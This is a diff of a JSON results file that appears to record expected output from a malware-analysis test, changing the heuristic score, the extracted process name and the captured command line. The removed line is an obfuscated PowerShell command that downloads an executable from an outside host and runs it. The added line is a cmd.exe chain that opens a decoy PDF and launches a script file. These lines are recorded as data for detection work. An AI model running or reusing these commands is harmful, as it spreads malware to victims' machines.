@@ -5,14 +5,14 @@
     },
     "result": {
         "heuristics": [
-            1
+            4
         ],
         "tags": {
             "file.name.extracted": [
-                "powershell.exe"
+                "cmd.exe"
             ],
             "dynamic.process.command_line": [
-                "Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\Users\\Public\\o5impa.e`xe;C:\\Users\\Public\\o5impa.e`xe"
+                "/c cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&start 2.pdf&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&start Microsoft\" \"Excel.WsF&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&exit"
             ]
         }
     }
